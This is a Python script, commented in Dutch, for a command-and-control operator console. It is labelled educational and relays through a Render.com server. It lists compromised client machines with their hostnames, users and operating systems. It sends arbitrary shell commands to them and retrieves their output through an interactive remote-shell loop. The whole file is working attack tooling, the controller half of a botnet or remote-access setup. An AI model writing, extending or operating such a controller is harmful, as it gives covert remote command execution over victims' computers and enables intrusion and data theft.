#!/usr/bin/env python3
"""
Kali Linux C2 Controller - Render.com Edition
Educational Cybersecurity Project
"""

import requests
import json
import time
from datetime import datetime

# Configuratie - VERANDER DEZE WAARDEN
RENDER_URL = "https://your-app-name.onrender.com"
ADMIN_TOKEN = "YOUR_SECRET_TOKEN_HERE"  # Moet matchen met Render environment variable

class C2Controller:
    def __init__(self, render_url, token):
        self.render_url = render_url.rstrip('/')
        self.headers = {
            'Authorization': f'Bearer {token}',
            'Content-Type': 'application/json'
        }
        self.session = requests.Session()
        self.session.headers.update(self.headers)
    
    def check_connection(self):
        """Test verbinding met Render server"""
        try:
            response = self.session.get(
                f"{self.render_url}/",
                timeout=10
            )
            response.raise_for_status()
            data = response.json()
            print(f"[✓] Verbonden met C2 server")
            print(f"    Status: {data.get('status')}")
            print(f"    Actieve clients: {data.get('activeClients', 0)}")
            return True
        except requests.exceptions.RequestException as e:
            print(f"[✗] Kan niet verbinden met server: {e}")
            return False
    
    def list_clients(self):
        """Lijst alle actieve clients"""
        try:
            response = self.session.get(
                f"{self.render_url}/admin/clients",
                timeout=10
            )
            response.raise_for_status()
            data = response.json()
            return data.get('clients', [])
        except requests.exceptions.HTTPError as e:
            if e.response.status_code == 401:
                print(f"[ERROR] Authenticatie gefaald - controleer ADMIN_TOKEN")
            else:
                print(f"[ERROR] HTTP {e.response.status_code}: {e}")
            return []
        except Exception as e:
            print(f"[ERROR] Kan clients niet ophalen: {e}")
            return []
    
    def send_command(self, client_id, command):
        """Stuur command naar specifieke client"""
        try:
            payload = {
                'clientId': client_id,
                'command': command
            }
            response = self.session.post(
                f"{self.render_url}/admin/command",
                json=payload,
                timeout=10
            )
            response.raise_for_status()
            return response.json()
        except Exception as e:
            print(f"[ERROR] Kan command niet versturen: {e}")
            return None
    
    def get_output(self, client_id):
        """Haal output op van client"""
        try:
            response = self.session.get(
                f"{self.render_url}/admin/output?id={client_id}",
                timeout=10
            )
            response.raise_for_status()
            return response.json()
        except requests.exceptions.HTTPError as e:
            if e.response.status_code == 404:
                return None
            print(f"[ERROR] HTTP {e.response.status_code}")
            return None
        except Exception as e:
            print(f"[ERROR] Kan output niet ophalen: {e}")
            return None
    
    def display_clients(self, clients):
        """Toon lijst van clients"""
        if not clients:
            print("\n[*] Geen actieve clients")
            return
        
        print("\n" + "="*70)
        print("ACTIEVE CLIENTS")
        print("="*70)
        
        for idx, client in enumerate(clients, 1):
            hostname = client.get('hostname', 'Unknown')
            username = client.get('username', 'Unknown')
            last_seen = client.get('lastSeen', 0)
            
            # Bereken tijdsverschil
            if last_seen:
                time_diff = int(time.time() * 1000) - last_seen
                seconds_ago = time_diff // 1000
                
                if seconds_ago < 60:
                    time_str = f"{seconds_ago}s geleden"
                elif seconds_ago < 3600:
                    time_str = f"{seconds_ago // 60}m geleden"
                else:
                    time_str = f"{seconds_ago // 3600}h geleden"
            else:
                time_str = "Onbekend"
            
            print(f"\n[{idx}] {hostname}")
            print(f"    User: {username}")
            print(f"    Last Seen: {time_str}")
            
            # Toon extra data indien beschikbaar
            data = client.get('data', {})
            if isinstance(data, dict):
                if data.get('type') == 'output':
                    cmd = data.get('command', 'N/A')
                    if len(cmd) > 50:
                        cmd = cmd[:47] + "..."
                    print(f"    Last Command: {cmd}")
                elif data.get('type') == 'init':
                    print(f"    Status: {data.get('message', 'Connected')}")
                    if data.get('os'):
                        print(f"    OS: {data.get('os')}")
        
        print("\n" + "="*70)
    
    def interactive_shell(self, client_id):
        """Interactieve shell voor specifieke client"""
        print(f"\n[*] Verbonden met {client_id}")
        print("[*] Type 'exit' om terug te keren naar menu")
        print("[*] Type 'clear' om scherm te wissen")
        print("[*] Commands worden asynchroon uitgevoerd (5s polling)")
        print()
        
        while True:
            try:
                command = input(f"{client_id}> ").strip()
                
                if not command:
                    continue
                
                if command.lower() == 'exit':
                    break
                
                if command.lower() == 'clear':
                    print("\033[2J\033[H", end="")
                    continue
                
                # Stuur command
                result = self.send_command(client_id, command)
                if result:
                    print(f"[+] Command in queue: {command}")
                    print("[*] Wacht op output (max 30s)...")
                    
                    # Poll voor output
                    for attempt in range(6):  # 6 x 5 seconden = 30 seconden
                        time.sleep(5)
                        output = self.get_output(client_id)
                        
                        if output and isinstance(output.get('data'), dict):
                            data = output['data']
                            if data.get('type') == 'output' and data.get('command') == command:
                                print("\n--- OUTPUT ---")
                                result_text = data.get('result', 'Geen output')
                                # Limiteer output lengte voor leesbaarheid
                                if len(result_text) > 5000:
                                    print(result_text[:5000])
                                    print(f"\n... (output truncated, {len(result_text)} chars total)")
                                else:
                                    print(result_text)
                                print("--- END ---\n")
                                break
                            elif data.get('type') == 'error':
                                print(f"\n[ERROR] {data.get('error', 'Unknown error')}\n")
                                break
                    else:
                        print("[!] Timeout - geen response ontvangen")
                        print("[!] Command kan nog steeds uitgevoerd worden\n")
                
            except KeyboardInterrupt:
                print("\n[*] Onderbroken door gebruiker")
                break
            except Exception as e:
                print(f"[ERROR] {e}")
    
    def main_menu(self):
        """Hoofd menu"""
        print("""
╔═══════════════════════════════════════════╗
║   KALI C2 CONTROLLER - RENDER EDITION     ║
║        EDUCATIONAL PROJECT ONLY           ║
╚═══════════════════════════════════════════╝
        """)
        
        # Check verbinding bij start
        if not self.check_connection():
            print("\n[!] Kan niet verbinden met server. Controleer:")
            print("    1. RENDER_URL in script")
            print("    2. ADMIN_TOKEN in script")
            print("    3. Render service is actief")
            input("\nDruk Enter om toch door te gaan...")
        
        while True:
            print("\n[1] Lijst actieve clients")
            print("[2] Verbind met client (interactieve shell)")
            print("[3] Stuur single command")
            print("[4] Test server verbinding")
            print("[5] Refresh status")
            print("[0] Exit")
            
            choice = input("\nKeuze> ").strip()
            
            if choice == '1':
                clients = self.list_clients()
                self.display_clients(clients)
            
            elif choice == '2':
                clients = self.list_clients()
                if not clients:
                    print("[!] Geen actieve clients")
                    continue
                
                self.display_clients(clients)
                client_idx = input("\nSelecteer client nummer> ").strip()
                
                try:
                    idx = int(client_idx) - 1
                    if 0 <= idx < len(clients):
                        client_id = clients[idx].get('hostname')
                        self.interactive_shell(client_id)
                    else:
                        print("[!] Ongeldige client nummer")
                except ValueError:
                    print("[!] Voer een geldig nummer in")
            
            elif choice == '3':
                clients = self.list_clients()
                if not clients:
                    print("[!] Geen actieve clients")
                    continue
                
                self.display_clients(clients)
                client_idx = input("\nSelecteer client nummer> ").strip()
                command = input("Command> ").strip()
                
                if not command:
                    print("[!] Geen command ingevoerd")
                    continue
                
                try:
                    idx = int(client_idx) - 1
                    if 0 <= idx < len(clients):
                        client_id = clients[idx].get('hostname')
                        result = self.send_command(client_id, command)
                        if result:
                            print(f"[+] Command verstuurd naar {client_id}")
                            print(f"[*] Check output met optie 1 over 5-10 seconden")
                    else:
                        print("[!] Ongeldige client nummer")
                except ValueError:
                    print("[!] Voer een geldig nummer in")
            
            elif choice == '4':
                self.check_connection()
            
            elif choice == '5':
                print("[*] Refreshing...")
                time.sleep(1)
            
            elif choice == '0':
                print("\n[*] Afsluiten...")
                break
            
            else:
                print("[!] Ongeldige keuze")

if __name__ == "__main__":
    print("\n[*] C2 Controller wordt gestart...")
    
    # Initialiseer controller
    controller = C2Controller(RENDER_URL, ADMIN_TOKEN)
    
    try:
        controller.main_menu()
    except KeyboardInterrupt:
        print("\n\n[*] Programma gestopt door gebruiker")
    except Exception as e:
        print(f"\n[FATAL ERROR] {e}")
        import traceback
        traceback.print_exc()
